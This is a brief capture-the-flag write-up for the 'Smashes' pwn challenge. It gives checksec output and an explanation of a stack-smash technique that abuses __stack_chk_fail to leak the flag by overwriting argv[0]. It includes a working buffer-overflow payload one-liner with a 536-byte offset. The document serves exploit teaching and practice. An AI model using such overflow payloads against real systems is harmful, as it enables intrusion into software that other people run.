# Smashes
## 0x00 checksec
>     Arch:     amd64-64-little
>     RELRO:    No RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      No PIE (0x400000)
>     FORTIFY:  Enabled
## 0x01 exp_logic
- Stack Smash [detailed explanation](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-smash)
- Use gdb-peda to calculate offset between buffer and $rsp
- Double memory map of short .data segment, detailed information can be found in 《程序员的自我修养》6.4.4-段地址对齐
- BTW, you are supposed to observe the codes in smashes-fortify_fail.c (DO take notice of function __libc_message)
To sum up, we should override the certain function in main function to call the __stack_chk_fail function, 
and then we can falsify *argv with the address of flag on the server by long override. So that can we print the flag while exploiting.
## 0x02 exp_script
- To begin with, local test is crucial to our exploit. Such as the following:
'''
python -c 'print "A"*536+"\x20\x0d\x40\x00\x00\x00\x00\x00"+"\n"+"a"' | ./smashes
''' 
- Then exp_script should be scripted. Ready exp_script can be found in smashes.py